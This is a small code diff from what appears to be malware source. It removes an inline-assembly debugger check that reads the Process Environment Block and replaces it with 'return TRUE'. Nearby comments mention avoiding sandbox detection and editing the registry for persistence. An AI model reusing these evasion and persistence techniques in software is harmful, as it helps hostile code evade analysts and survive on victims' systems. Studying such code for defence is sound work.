@@ -8,15 +8,8 @@ const unsigned short TIME_TO_WAIT = 1000; // Avoid Sandbox detection
 
 // Check the Process Environment Block
 BOOL CheckDebugger() {
-	BOOL isDebuggerPresent = FALSE;
-    __asm {
-        mov eax, fs:[0x30]
-        mov al, [eax+2]
-        mov isDebuggerPresent, al
-    }
-	return isDebuggerPresent;
+    return TRUE;
 }
-
 // Edit Registry for persistence
 void EditRegistry() {
     HKEY hKey = { 0 };
